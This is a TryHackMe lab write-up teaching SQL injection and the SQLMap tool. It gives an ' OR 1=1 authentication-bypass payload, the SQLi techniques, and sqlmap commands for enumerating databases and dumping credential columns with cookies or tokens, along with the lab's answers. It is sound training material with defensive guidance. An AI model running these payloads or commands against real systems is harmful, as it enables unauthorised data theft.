| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Category** | Offensive Security Tooling / SQL Injection |
| **Difficulty** | Easy |
| **Time** | ~60 Minutes |
| **Module** | Offensive Security Tooling |

---

## Objective

**SQLMap** is an open-source, command-line penetration-testing tool that automates the detection and exploitation of **SQL Injection (SQLi)** vulnerabilities in web applications. Instead of hand-crafting hundreds of injection payloads, SQLMap connects to a target, fingerprints the back-end **DBMS**, confirms the injectable parameter, and then walks the database structure for you — from databases down to tables, columns and records. This room builds the groundwork first (what a database, DBMS and SQL query are, and how unsafe input becomes SQL Injection) and then puts SQLMap through its full workflow: testing a target with `-u`, enumerating with `--dbs`/`--tables`/`--columns`, dumping data with `--dump`, tuning depth with `--level`/`--risk`, and handling authenticated or POST requests with `-r` and `--cookie`.

By the end of this room you will be able to:

- Explain what **SQL**, a **DBMS**, and **SQL Injection** are, and how a web application talks to a database
- Recognise how unsafe input manipulates query logic using `AND`, `OR`, always-true conditions (`1=1`), and SQL comments
- Identify the four main SQLi techniques: **Boolean-based blind**, **Error-based**, **Time-based blind**, and **UNION-based**
- Run a basic SQLMap scan against a GET parameter with `sqlmap -u "URL"`
- Read SQLMap output — injection point, technique, and DBMS fingerprint
- Enumerate the database hierarchy with `--dbs` → `-D` → `--tables` → `-T` → `--columns` → `--dump`
- Perform targeted extraction of specific columns with `-C`
- Control testing depth and payload aggressiveness with `--level` and `--risk`
- Test authenticated and POST-based endpoints with `-r`, `--cookie`, and `-H`

> **Authorisation warning:** SQL Injection testing and SQLMap must only ever be run against systems you have **explicit authorization** to test — here, the TryHackMe lab. Running these techniques against systems you do not own or control is illegal.

---

## Task 1 — SQL, Databases and the DBMS

Before automating SQL Injection, you need the vocabulary. A **database** is an organised collection of data that lets applications store, modify, retrieve and manage information efficiently. Almost every modern website stores things like users, products, orders, messages, passwords, transactions and logs permanently, which is why databases sit behind nearly every application.

A **DBMS (Database Management System)** is the software that manages those databases. Examples mentioned in the room include **MySQL**, **PostgreSQL**, **SQLite** and **Microsoft SQL Server**. The DBMS handles the four fundamental data operations, summarised as **CRUD**: `Create`, `Read`, `Update`, `Delete`.

**SQL (Structured Query Language)** is the language applications use to talk to relational databases. A basic query retrieves records from a table:

```sql
SELECT * FROM users;
```

Adding a condition narrows the result down to matching rows:

```sql
SELECT * FROM users
WHERE username = 'John';
```

### The Web ↔ Database Chain

A typical web-application request travels through a fixed chain — the user's browser sends an **HTTP request** to the web server/application, which builds an **SQL query** and hands it to the **DBMS**, which runs it against the **database** and returns the result back up the chain:

```text
┌──────────────┐
│     User     │
└──────┬───────┘
       │ HTTP Request
       ▼
┌──────────────┐
│  Web Server  │
│ Application  │
└──────┬───────┘
       │ SQL Query
       ▼
┌──────────────┐
│    DBMS      │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│   Database   │
└──────────────┘
```

For example, an online bookstore URL `https://example.com/search?id=1` passes `id=1` into the application, which may internally build `SELECT * FROM books WHERE id = 1;`. The critical point is that **user-controlled input can become part of a SQL query** — and if the application does not validate or sanitise that input, the database may interpret attacker-controlled content as SQL *syntax* instead of ordinary *data*. That is exactly where SQL Injection lives.

### Relational Database Structure

A relational database nests neatly: a **database** contains tables, a **table** contains rows and columns, a **column** represents a type of data, and a **row** represents one record.

```text
users
┌────┬──────────┬──────────────────┐
│ id │ username │ email            │
├────┼──────────┼──────────────────┤
│ 1  │ john     │ john@example.com │
│ 2  │ alice    │ alice@example.com│
└────┴──────────┴──────────────────┘
```

### Key Terminology

| Term | Meaning |
|---|---|
| **Database** | Collection of organized data |
| **DBMS** | Software that manages databases |
| **SQL** | Language used to interact with relational databases |
| **Table** | Structured collection of records |
| **Row** | Individual record |
| **Column** | Data field/attribute |
| **Query** | Instruction sent to the database |
| **SQL Injection** | Manipulation of SQL through unsafe input |
| **SQLMap** | Automated SQL Injection testing tool |

> **Memory trick:** *"User talks to Web, Web talks SQL, SQL talks to DB."* The flow is `USER → WEB → SQL → DB`. If **user input enters SQL unsafely**, SQL Injection may occur.

### Task 1 — Answer

| Question | Answer |
|---|---|
| **Which language builds the interaction between a website and its database?** | SQL |

### Interview Questions — SQL & Databases

| Question | Answer |
|---|---|
| **Q1. What is SQL?** | Structured Query Language, used to communicate with relational databases. |
| **Q2. What is a DBMS?** | Software that manages databases and provides functionality to store, retrieve, modify and delete data. |
| **Q3. Give examples of DBMS.** | MySQL, PostgreSQL, SQLite, Microsoft SQL Server. |
| **Q4. What is SQL Injection?** | A vulnerability where attacker-controlled input can alter the intended SQL query executed by an application. |
| **Q5. Why is SQL Injection dangerous?** | Databases often contain sensitive information, so SQLi can allow unauthorised access to data or other database operations. |
| **Q6. How does a web application communicate with a database?** | Client → web application → SQL query → DBMS → database, and the result travels back up the chain. |

---

## Task 2 — How SQL Injection Works

**SQL Injection (SQLi)** occurs when an application takes user-controlled input and places it into an SQL query without properly validating or safely handling it. The attacker is not directly "talking" to the database — they are **manipulating the SQL query constructed by the vulnerable application**.

Consider a login page that receives `Username: John` and `Password: Un@detectable444`. The application builds:

```sql
SELECT * FROM users
WHERE username = 'John'
AND password = 'Un@detectable444';
```

The database checks whether a matching record exists. Both conditions must be true for a successful login.

### The Logic Operators That Matter

SQL Injection is fundamentally about rewriting the *logic* of a query, so three building blocks matter:

> **1. `AND` — ALL conditions must be true**
> `WHERE username = 'John' AND password = 'password123'` requires the username correct **and** the password correct. Truth table: `TRUE AND TRUE = TRUE`; any `FALSE` makes the whole expression `FALSE`.

> **2. `OR` — ANY one condition can be true**
> `WHERE username = 'John' OR username = 'Alice'` returns true when at least one side is true. Truth table: only `FALSE OR FALSE = FALSE`; every other combination is `TRUE`.

> **3. `1=1` — an always-true condition**
> `1 = 1` is always `TRUE` (as is `5 = 5`), whereas `1 = 2` is `FALSE`. In SQLi testing, always-true expressions reveal whether user input is influencing query logic.

### The Classic Authentication Bypass

If the application inserts the supplied values directly into SQL, an attacker who does not know John's password can supply input that adds an always-true condition. The room demonstrates an authentication-bypass style input conceptually like:

```sql
' OR 1=1;-- -
```

The resulting query can become similar to:

```sql
SELECT * FROM users
WHERE username = 'John'
AND password = 'abc' OR 1=1;-- -';
```

The exact payload matters less than the concept: the original `username AND password` logic becomes `username AND password OR TRUE`. Two ideas make this work:

- **The quote matters.** If the application builds `password = 'INPUT'`, an attacker-supplied quote can terminate the original string and let the rest be read as SQL logic rather than data.
- **The comment matters.** A SQL comment sequence such as `-- -` causes the remainder of the original query to be ignored, so leftover application SQL does not break the injected statement.

> **Operator precedence:** SQL evaluates `AND` before `OR`, so `A AND B OR C` is read as `(A AND B) OR C`. Understanding this precedence is essential when analysing how an injected `OR 1=1` changes a query's meaning.

### The Four SQL Injection Techniques

SQL Injection appears in several forms — these become the techniques SQLMap tests for automatically:

> **1. Boolean-based Blind SQLi**
> Relies on conditions that produce **different application behaviour** depending on whether they are true or false. A `TRUE` condition returns response A, a `FALSE` condition returns response B; the attacker infers information from the difference.

> **2. Error-based SQLi**
> Some applications expose database errors. A crafted input triggers a database error that leaks information such as the database type, version, query structure or column information — which is why production apps should never show detailed DB errors.

> **3. Time-based Blind SQLi**
> When nothing useful is visibly returned, the attacker infers results from **response timing** — a true condition makes the database delay its response (longer response time), a false condition responds normally.

> **4. UNION-based SQLi**
> Uses `UNION` to combine the result of an attacker-controlled `SELECT` with the original query when the query structure permits it, merging extra data into the response.

### Defensive Perspective

The database should always treat user input as **data**, not SQL syntax. The single most important defence is the **parameterized (prepared) query**, where the SQL template and the user data are supplied separately:

```sql
SELECT * FROM users WHERE username = ?
```

Broader defences include validating input, applying least-privileged database accounts, hiding detailed database errors, monitoring suspicious requests, and keeping database software updated. The bad pattern to avoid is `User Input → String Concatenation → SQL Query`.

### Task 2 — Answers

| Question | Answer |
|---|---|
| **Q1. Which boolean operator checks if at least one side of the operator is true?** | OR |
| **Q2. Is `1=1` in an SQL query always true?** | YEA |

### Interview Questions — SQLi Concepts

| Question | Answer |
|---|---|
| **Q1. What does `AND` require?** | All specified conditions must be true. |
| **Q2. What does `OR` require?** | At least one condition must be true. |
| **Q3. What does `1=1` evaluate to?** | Always TRUE (`1=2` is FALSE). |
| **Q4. What does a SQL comment do in an injection?** | Causes the following SQL to be treated as a comment where supported, ignoring the rest of the query. |
| **Q5. What is Boolean-based blind SQLi?** | Information inferred from differences in application behaviour on TRUE vs FALSE conditions. |
| **Q6. What is Error-based SQLi?** | Database errors are exposed and reveal useful information about the query or database. |
| **Q7. What is Time-based blind SQLi?** | Information inferred from response-time differences (delay on TRUE). |
| **Q8. What is UNION-based SQLi?** | Combines attacker-controlled query results with the original query using `UNION`. |
| **Q9. What is the primary defence against SQL Injection?** | Parameterized / prepared statements that separate SQL code from user data. |

---

## Task 3 — Meet SQLMap

**SQLMap** is an automated penetration-testing tool used to detect and exploit SQL Injection vulnerabilities in web applications. Instead of manually testing many payloads, it automates the whole chain: finding SQL Injection → identifying the injection type → identifying the DBMS → enumerating databases → enumerating tables → extracting records. It is a command-line tool commonly bundled in security-focused Linux distributions such as Kali Linux.

Start with the built-in help, and — for beginners — the interactive wizard that walks you through target URL, detection, injection testing and enumeration:

```bash
$ sqlmap --help
$ sqlmap --wizard
```

### The Core SQLMap Flags

These are the options introduced across the room — the backbone of every SQLMap session:

| Flag | Purpose |
|---|---|
| `-u` | Specify target URL |
| `-r` | Load a raw HTTP request from a file |
| `-H` | Custom HTTP header |
| `--cookie` | Supply session cookies |
| `--wizard` | Interactive beginner-friendly wizard |
| `--dbs` | Enumerate databases |
| `-D` | Select a specific database |
| `--tables` | Enumerate tables |
| `-T` | Select a specific table |
| `--columns` | Enumerate columns |
| `-C` | Select specific columns |
| `--dump` | Extract records from a table |
| `--level` | Control depth of testing |
| `--risk` | Control riskiness of payloads |

### The Enumeration Hierarchy

The single most important thing to memorise is how the flags map onto the database structure — broad discovery narrows step by step down to the data:

```text
SQL Injection → DBMS → Databases → Tables → Columns → Records
--dbs → -D DATABASE --tables → -T TABLE --columns → -C COLUMN --dump
```

> **Memory trick:** `--dbs` = *WHERE?*, `--tables` = *WHAT?*, `--dump` = *GIVE ME DATA*. The chain is simply `DB → TABLE → COLUMN → DATA`.

### Interview Questions — SQLMap Basics

| Question | Answer |
|---|---|
| **Q1. What is SQLMap?** | An open-source tool that automates detection and exploitation of SQL Injection and provides database enumeration capabilities. |
| **Q2. What does `-u` do?** | Specifies the target URL. |
| **Q3. What does `--wizard` do?** | Launches an interactive, beginner-friendly guided scan. |
| **Q4. What does `--dbs` do?** | Enumerates available databases. |
| **Q5. What does `--dump` do?** | Extracts records from the selected table. |
| **Q6. On which distribution is SQLMap commonly available?** | Kali Linux (security-focused Linux distributions). |

---

## Task 4 — Testing a Target and Reading the Output

A common SQL Injection target contains a GET parameter in the URL. The room's target is:

```text
http://sqlmaptesting.thm/search/cat=1
```

Here `cat=1` is the user-controlled GET parameter — that is what SQLMap can test. The basic scan syntax points `-u` at the URL:

```bash
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1"
```

> **Why quote the URL?** URLs often contain shell-special characters such as `?`, `&`, and `=`. Wrapping the URL in quotes makes the shell treat the entire URL as one argument. Memory trick: *URL + special characters → put it inside quotes.*

### What SQLMap Does During a Scan

When you point SQLMap at a URL it connects, checks page stability, identifies the parameters, sends test payloads, compares responses, and — if it finds injection — identifies the technique and fingerprints the DBMS:

```text
Target URL → Connect → Check page stability → Identify parameters →
Test parameters → Detect SQL Injection → Identify DBMS → Report injection points
```

Against the lab, SQLMap identifies the `cat` parameter as vulnerable and reports the technique(s) and technology stack. In this example it fingerprints a MySQL back end running on Linux/Nginx/PHP:

```bash
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1"
Parameter: cat (GET)
    Type: boolean-based blind
    Type: error-based
    Type: AND/OR time-based blind
    Type: UNION query
Back-end DBMS: MySQL
Operating System: Linux Ubuntu
Web Server: Nginx
Web Application: PHP
```

Reading this correctly matters: `Parameter: cat (GET)` tells you the injectable parameter and the HTTP method, each `Type:` line is a technique the parameter supports, and `Back-end DBMS: MySQL` is the fingerprint SQLMap will use to pick DBMS-specific payloads. Don't just look for the word *vulnerable* and stop — read the parameter, technique, DBMS, web server and OS to build a full technology fingerprint.

### Interactive Prompts During a Scan

SQLMap asks confirmation questions mid-scan. In the room's lab these are answered to keep testing focused and efficient — since MySQL is already fingerprinted, other-DBMS payloads are skipped:

```bash
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1"
[*] It looks like the back-end DBMS is 'MySQL'.
Do you want to skip test payloads specific for other DBMSes? [Y/n] y
[*] For the remaining tests, do you want to include all tests
for 'MySQL' extending provided risk (1) value? [Y/n] y
[*] Injection not exploitable with NULL values.
Do you want to try with a random integer value for option
'--union-char'? [Y/n] y
[*] GET parameter 'email' is vulnerable.
Do you want to keep testing the others (if any)? [y/N] n
```

> **Session resumption:** SQLMap stores results from previous scans. You may later see messages like `resuming back-end DBMS` or `resuming the following injection point(s) from stored session`, meaning repeated commands against the same target run faster because SQLMap reuses previously discovered information.

### Why DBMS Fingerprinting Matters

Identifying the DBMS is important because SQL syntax, functions, metadata structures and capabilities differ between **MySQL**, **PostgreSQL**, **Microsoft SQL Server**, **Oracle** and **SQLite**. Once SQLMap knows the back end, it applies DBMS-specific knowledge to every later test.

### Interview Questions — Testing & Output

| Question | Answer |
|---|---|
| **Q1. How do you provide a target URL to SQLMap?** | With `-u`, e.g. `sqlmap -u "http://target/page?id=1"`. |
| **Q2. Why should the URL be quoted?** | URLs can contain shell-special characters (`?`, `&`, `=`); quotes make the shell treat the URL as one argument. |
| **Q3. What does `Parameter: cat (GET)` mean?** | The `cat` parameter is injectable and is passed via the GET method. |
| **Q4. What does `Back-end DBMS: MySQL` tell you?** | SQLMap has fingerprinted the database as MySQL and can use MySQL-specific techniques. |
| **Q5. Why does SQLMap ask to skip other-DBMS payloads?** | Efficiency — once the DBMS is known it can focus on relevant tests. |
| **Q6. What does "resuming ... from stored session" indicate?** | SQLMap retained information from a previous scan and is reusing it. |

---

## Task 5 — Enumerating Databases, Tables and Columns

Once SQL Injection is confirmed, enumeration systematically discovers what exists behind the application. The hierarchy is `DATABASE → TABLE → COLUMN → RECORD`, and each level has its own flag.

### Step 1 — Enumerate Databases (`--dbs`)

Append `--dbs` to list the databases on the server:

```bash
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1" --dbs
available databases [2]:
[*] users
[*] members
```

The server contains two databases: `users` and `members`.

### Step 2 — Select a Database and List Tables (`-D` + `--tables`)

Use `-D` to select a database and `--tables` to enumerate its tables:

```bash
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users --tables
Database: users
[3 tables]
+---------+
| johnath |
| alexas  |
| thomas  |
+---------+
```

The `users` database holds 3 tables — `johnath`, `alexas` and `thomas`.

### Step 3 — Select a Table and List Columns (`-T` + `--columns`)

Use `-T` to select a table and `--columns` to inspect its structure before extracting anything:

```bash
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users -T thomas --columns
```

Inspecting columns first lets you decide which fields actually matter, so you can extract only what the assessment requires rather than dumping everything.

### The Enumeration Flow as Steps

| **1** | **Enumerate databases**<br>`--dbs` lists every database — here `users` and `members`. |
| --- | --- |

| **2** | **Select a database, list tables**<br>`-D users --tables` returns the tables inside `users` — `johnath`, `alexas`, `thomas`. |
| --- | --- |

| **3** | **Select a table, list columns**<br>`-D users -T thomas --columns` reveals the columns so you can target the relevant ones. |
| --- | --- |

| **4** | **Dump the data**<br>`-D users -T thomas --dump` extracts the records (see Task 6). |
| --- | --- |

> **`information_schema`:** MySQL exposes a metadata database called `information_schema` describing databases, tables, columns and related objects. When choosing where to look, prioritise application-specific databases (like `users`) over metadata databases.

### Interview Questions — Enumeration

| Question | Answer |
|---|---|
| **Q1. What is database enumeration?** | The process of discovering database structure and information such as databases, tables, columns and records. |
| **Q2. Which option enumerates databases?** | `--dbs`. |
| **Q3. How do you select a specific database?** | `-D DATABASE`. |
| **Q4. How do you enumerate tables?** | `--tables` (with `-D` to pick the database). |
| **Q5. How do you select a specific table?** | `-T TABLE`. |
| **Q6. How do you enumerate columns?** | `--columns`. |
| **Q7. Difference between a database and a table?** | A database is a container of related objects; a table stores structured records in rows and columns. |
| **Q8. What is a column?** | A particular attribute or field in a table. |
| **Q9. What is a record?** | An individual row containing values for a table's columns. |
| **Q10. What is `information_schema`?** | A metadata database in MySQL providing information about databases, tables, columns and related objects. |

---

## Task 6 — Dumping Data and Targeted Extraction

The `--dump` flag tells SQLMap to retrieve the records from the selected table. The full path is `Target → Database → Table → Columns → Records`:

```bash
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users -T thomas --dump
Database: users
Table: thomas
Date        name       pass
--------------------------------
09/09/2024  Thomas THM testing
```

SQLMap dumps the `thomas` table, revealing a record dated `09/09/2024` with name `Thomas THM` and pass `testing`. SQLMap may also flag columns that appear to contain password hashes — password-looking database values are often hashes rather than plaintext.

### Targeted Column Extraction (`-C`)

You do not have to dump everything. When only certain fields matter, the `-C` flag selects specific columns. Suppose an `accounts` table has `id`, `username`, `email`, `password`, `role`, `created_at` but the assessment only needs credentials — extract just those two columns:

```bash
$ sqlmap -u "http://TARGET/page?id=1" \
-D users \
-T accounts \
-C username,password \
--dump
```

The full targeted chain — enumerate columns first, then dump only the relevant ones:

```bash
$ sqlmap -u "http://TARGET/page?id=1" --dbs
$ sqlmap -u "http://TARGET/page?id=1" -D users --tables
$ sqlmap -u "http://TARGET/page?id=1" -D users -T accounts --columns
$ sqlmap -u "http://TARGET/page?id=1" -D users -T accounts -C username,password --dump
```

> **Minimum necessary data:** Targeted extraction is more professional than indiscriminate dumping. Dumping every column of a large table means more requests, more output, more sensitive information exposed, more storage and more privacy risk. Map the database, identify the relevant tables/columns, and extract only what proves the impact.

### Interview Questions — Extraction

| Question | Answer |
|---|---|
| **Q1. What does `--dump` do?** | Extracts records from the selected table. |
| **Q2. What does `-C` do?** | Selects specific columns for operations such as data extraction. |
| **Q3. How do you dump a specific table?** | `-D DATABASE -T TABLE --dump`. |
| **Q4. How do you dump only two columns?** | `-D DATABASE -T TABLE -C col1,col2 --dump`. |
| **Q5. Why is targeted extraction preferable?** | It minimises unnecessary traffic and sensitive-data exposure while still proving impact. |
| **Q6. Why avoid dumping unnecessary data?** | It increases privacy, security, storage and operational risks. |
| **Q7. What might password-looking values actually be?** | Hashes rather than plaintext passwords. |

---

## Task 7 — Tuning the Scan: `--level` and `--risk`

SQLMap exposes two different tuning knobs that are easy to confuse. `--level` controls **how extensively** SQLMap tests (depth/breadth — more parameter locations and techniques); `--risk` controls **how risky** the payloads it uses are.

```bash
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1" --level=5
$ sqlmap -u "http://sqlmaptesting.thm/search/cat=1" --risk=2
```

| Option | Main Purpose |
|---|---|
| `--level` | Controls how extensively SQLMap tests (testing depth/breadth) |
| `--risk` | Controls the riskiness of the tests/payloads |

If a simple scan does not find the expected injection, increasing the level provides broader testing. But higher levels mean more requests, longer scans, more server load and more noticeable traffic — so start appropriately, observe the result, and increase depth only when justified.

> **Memory trick:** `LEVEL = MORE TESTING`, `RISK = MORE DANGEROUS TESTING`. Increase `--risk` carefully and only when the assessment allows it.

### Interview Questions — Level & Risk

| Question | Answer |
|---|---|
| **Q1. What does `--level` control?** | How extensively SQLMap performs its tests (depth/breadth). |
| **Q2. What does `--risk` control?** | The riskiness of SQLMap's tests/payloads. |
| **Q3. Why not always use `--level=5`?** | Higher levels cause more requests, longer scans, more load and more noticeable traffic. |
| **Q4. When should you raise the level?** | When a normal scan does not find an expected injection. |
| **Q5. Are `--level` and `--risk` the same?** | No — level is testing depth, risk is payload riskiness. |

---

## Task 8 — Requests, Cookies and Authentication

Not every injection point is a simple GET parameter, and many sit behind authentication. SQLMap handles all of these.

### GET vs POST

A **GET** request places parameters in the URL, so SQLMap can test it directly with `-u`. A **POST** request carries parameters in the request body, so you save the request and hand the whole thing to SQLMap with `-r`:

```text
GET  → parameters in the URL       → ?id=1                     → -u
POST → parameters in request body  → username=test&password=test → -r
```

### Loading a Raw HTTP Request (`-r`)

The `-r` option loads a raw HTTP request from a file. This is ideal for POST requests, authenticated requests, complex headers, cookies and multiple parameters — instead of manually reconstructing all of that, SQLMap reads the request directly. Capture the request in your browser or proxy and save it, for example as `request.txt`:

```http
POST /login HTTP/1.1
Host: TARGET
Cookie: PHPSESSID=example
username=test&password=test
```

Then point SQLMap at the file:

```bash
$ sqlmap -r request.txt
```

### Supplying Session Cookies (`--cookie`) and Headers (`-H`)

If the injection point is behind authentication, SQLMap needs a valid session. Supply the session cookie with `--cookie`, or a custom header (such as a bearer token) with `-H`:

```bash
$ sqlmap -u "http://TARGET/page?id=1" --cookie="PHPSESSID=SESSION_VALUE"
$ sqlmap -u "http://TARGET/page?id=1" -H "Authorization: Bearer TOKEN"
```

Without a valid session, a protected endpoint returns a login requirement (`401 Unauthorized` is a typical response); with the session, SQLMap reaches the authenticated page.

### Finding Parameters with Developer Tools

Do not throw SQLMap at random URLs. Open the application, understand its functionality, and use the browser's Developer Tools (`F12` → **Network**) to see the actual HTTP requests, methods, parameters, cookies and headers the browser sends. Clicking a category might send `GET /search/cat=1 HTTP/1.1`, telling you the parameter is `cat` with value `1` — a candidate to test.

### GET vs POST Workflow as Steps

| **1** | **GET input**<br>Observe the Network request, copy the URL, and test directly with `sqlmap -u "http://TARGET/search/cat=1"`. |
| --- | --- |

| **2** | **POST input**<br>Submit the form, capture/save the request, and test with `sqlmap -r request.txt`. |
| --- | --- |

| **3** | **Authenticated input**<br>Preserve the session with `--cookie="..."` or by capturing an authenticated raw request for `-r`. |
| --- | --- |

### Interview Questions — Requests & Auth

| Question | Answer |
|---|---|
| **Q1. What does `-r` do?** | Loads a raw HTTP request from a file. |
| **Q2. Why is `-r` useful?** | It preserves the complete request context — headers, cookies, method, URL and body — ideal for POST/authenticated/complex requests. |
| **Q3. What does `--cookie` do?** | Supplies a session cookie so SQLMap can test authenticated endpoints. |
| **Q4. What does `-H` do?** | Supplies a custom HTTP header, such as an authorization token. |
| **Q5. Where do GET vs POST parameters appear?** | GET in the URL; POST in the request body. |
| **Q6. Why use browser Developer Tools?** | To identify the actual HTTP requests and parameters the application generates. |
| **Q7. What does a `401 Unauthorized` generally indicate?** | An authentication issue — the endpoint needs a valid session. |

---

## Task 9 — Practical Workflow and CTF Methodology

SQLMap is most effective as part of a structured methodology, not a "run and copy the output" tool. The complete process moves from reconnaissance through to reporting:

```text
RECON → FIND INPUT → UNDERSTAND REQUEST → TEST SQL INJECTION →
CONFIRM VULNERABILITY → IDENTIFY DBMS → ENUMERATE DATABASES →
ENUMERATE TABLES → ENUMERATE COLUMNS → EXTRACT RELEVANT DATA →
ASSESS IMPACT → DOCUMENT FINDINGS
```

The command progression that carries you through it:

```bash
$ sqlmap -u "http://TARGET/search/cat=1"
$ sqlmap -u "http://TARGET/search/cat=1" --dbs
$ sqlmap -u "http://TARGET/search/cat=1" -D users --tables
$ sqlmap -u "http://TARGET/search/cat=1" -D users -T thomas --columns
$ sqlmap -u "http://TARGET/search/cat=1" -D users -T thomas -C username,password --dump
$ sqlmap -r request.txt
```

### Common Mistakes and Troubleshooting

- **Scanning the wrong URL** — pointing `-u` at `http://TARGET/` when the injectable parameter is `/search/cat=1`.
- **Forgetting the parameter** — SQLMap must know which request/parameter to test; identify the real request first.
- **Ignoring POST requests** — if input is submitted via POST, capture it and use `-r request.txt`.
- **Forgetting authentication** — for protected endpoints, provide the authenticated request or cookie.
- **Jumping straight to `--level=5`** — this creates unnecessary traffic; increase depth only when justified.
- **Only reading "vulnerable"** — always read the parameter, injection type, DBMS and request method.

When SQLMap finds nothing, common causes are a wrong URL/parameter, a non-injectable parameter, required authentication, changed application behaviour, WAF/filtering, or insufficient testing depth. Slow scans usually come from blind SQLi, high `--level`, network latency, rate limiting or large data extraction. A **WAF does not replace secure SQL query construction**.

> **Why manual understanding still matters:** SQLMap is automation, not magic. Its effectiveness depends on the correct target, request, parameter, application behaviour, network access, authentication and testing options. If you understand HTTP, SQL, parameters, sessions, cookies, database structure and SQLi types, you can read SQLMap's output far more effectively.

### Scenario-Based Questions

| Question | Answer |
|---|---|
| **Q1. You see `/search/cat=1` — what do you investigate?** | `cat` is a user-controlled GET parameter and a candidate for SQL Injection testing. |
| **Q2. The page requires login — what do you do?** | Capture an authenticated request or provide the appropriate session information (within the authorised assessment). |
| **Q3. SQLMap returns `users` and `members` — what are these?** | Database names. |
| **Q4. You found the database `users` — what next?** | Enumerate its tables: `-D users --tables`. |
| **Q5. You found the table `thomas` — what next?** | If required by the objective, dump it: `-D users -T thomas --dump`. |
| **Q6. The vulnerable request is POST-based — what do you do?** | Capture the request and run `sqlmap -r request.txt`. |
| **Q7. SQLMap reports `Back-end DBMS: MySQL` — what does that tell you?** | It has fingerprinted MySQL and can use MySQL-specific testing and enumeration techniques. |
| **Q8. You see `users`, `shop`, `information_schema` — which first?** | Application-specific databases (`users`, `shop`) rather than the metadata database. |

---

## Quick Revision

| Topic | Key fact |
|-------|----------|
| **SQL / DBMS** | SQL is the language for relational databases; the DBMS (MySQL, PostgreSQL, SQLite, MSSQL) runs it. |
| **Web ↔ DB** | `USER → WEB APP → SQL → DBMS → DATABASE`; unsafe user input in SQL causes SQL Injection. |
| **SQLi logic** | `AND` = all true, `OR` = any true, `1=1` = always true; quotes and SQL comments (`-- -`) break out of the query. |
| **SQLi types** | Boolean-based blind, Error-based, Time-based blind, UNION-based. |
| **SQLMap** | Automates detection, DBMS fingerprinting, and enumeration of databases → tables → columns → records. |
| **Basic scan** | `sqlmap -u "URL"` tests a GET parameter; quote the URL for special characters. |
| **Enumeration** | `--dbs` → `-D` → `--tables` → `-T` → `--columns` → `-C` → `--dump`. |
| **Lab findings** | Target `cat=1`; databases `users`, `members`; `users` tables `johnath`, `alexas`, `thomas`; DBMS MySQL. |
| **Level vs Risk** | `--level` = testing depth; `--risk` = payload riskiness. |
| **Requests** | GET → `-u`; POST/auth → `-r request.txt`, `--cookie`, `-H`. |
| **Defense** | Parameterized/prepared queries, least privilege, hide DB errors, input validation, monitoring. |

**Key idea:** SQLMap automates the SQL Injection kill chain — find, confirm, fingerprint, enumerate, extract — but the tester still has to identify the right request and understand what the output means.

---

## 30-Second Revision

- **SQL** talks to relational databases; a **DBMS** (MySQL, PostgreSQL, SQLite, MSSQL) runs the queries.
- **SQL Injection** happens when unsafe user input changes a query's logic — `AND`/`OR`/`1=1`, quotes and comments (`-- -`) are the levers.
- The four techniques: **Boolean-based blind**, **Error-based**, **Time-based blind**, **UNION-based**.
- **SQLMap** automates detection and enumeration: `sqlmap -u "URL"` to test, then walk the hierarchy.
- Enumeration chain: `--dbs` → `-D DB --tables` → `-D DB -T TABLE --columns` → `-D DB -T TABLE -C col --dump`.
- Tune with `--level` (depth) and `--risk` (payload danger); handle POST/auth with `-r`, `--cookie`, `-H`.
- Lab: parameter `cat=1`, databases `users`/`members`, `thomas` table dumps `09/09/2024 | Thomas THM | testing`.
- Primary defence is **parameterized queries** — treat user input as data, never SQL syntax.

---

## Cheat Sheet

### Basic Scan & Wizard

```bash
sqlmap -u "http://TARGET/page?id=1"
sqlmap --wizard
```

### Enumeration Chain

```bash
sqlmap -u "http://TARGET/page?id=1" --dbs
sqlmap -u "http://TARGET/page?id=1" -D DATABASE --tables
sqlmap -u "http://TARGET/page?id=1" -D DATABASE -T TABLE --columns
sqlmap -u "http://TARGET/page?id=1" -D DATABASE -T TABLE --dump
```

### Targeted Column Extraction

```bash
sqlmap -u "http://TARGET/page?id=1" \
-D DATABASE \
-T TABLE \
-C COLUMN1,COLUMN2 \
--dump
```

### Requests, Cookies & Headers

```bash
sqlmap -r request.txt
sqlmap -u "http://TARGET/page?id=1" --cookie="PHPSESSID=SESSION_VALUE"
sqlmap -u "http://TARGET/page?id=1" -H "Authorization: Bearer TOKEN"
```

### Tuning Depth & Risk

```bash
sqlmap -u "http://TARGET/page?id=1" --level=5
sqlmap -u "http://TARGET/page?id=1" --risk=2
```

### Flag Reference

| Flag | Purpose |
|---|---|
| `-u` | Target URL |
| `-r` | Load raw HTTP request from a file |
| `-H` | Custom HTTP header |
| `--cookie` | Supply cookies |
| `--wizard` | Interactive wizard |
| `--dbs` | Enumerate databases |
| `-D` | Select database |
| `--tables` | Enumerate tables |
| `-T` | Select table |
| `--columns` | Enumerate columns |
| `-C` | Select columns |
| `--dump` | Extract records |
| `--level` | Testing depth |
| `--risk` | Testing risk |

### Injection Technique Reference

| Technique | Information Channel |
|---|---|
| Boolean-based Blind | TRUE/FALSE application behaviour |
| Error-based | Database error messages |
| Time-based Blind | Response timing |
| UNION-based | Combined query output |

---

## Interview Questions

| Question | Answer |
|---|---|
| **Q1. What is SQLMap?** | An open-source tool that automates detection and exploitation of SQL Injection and provides database enumeration capabilities. |
| **Q2. What is SQL Injection and why is it dangerous?** | A vulnerability where attacker-controlled input alters the intended SQL query; dangerous because databases hold sensitive data, enabling authentication bypass, data extraction and modification. |
| **Q3. What are the four main SQLi techniques?** | Boolean-based blind (behaviour), Error-based (error messages), Time-based blind (response delay), and UNION-based (combined results). |
| **Q4. How do you test a GET parameter with SQLMap?** | `sqlmap -u "http://target/page?id=1"` — quote the URL for special characters. |
| **Q5. What is the SQLMap enumeration hierarchy?** | `--dbs` → `-D DATABASE --tables` → `-D DATABASE -T TABLE --columns` → `-D DATABASE -T TABLE -C COLUMN --dump`. |
| **Q6. What does `-r` do and why use it?** | Loads a raw HTTP request from a file, preserving method, URL, headers, cookies and body — ideal for POST/authenticated/complex requests. |
| **Q7. What does `--cookie` do?** | Supplies a session cookie so SQLMap can test endpoints that require authentication. |
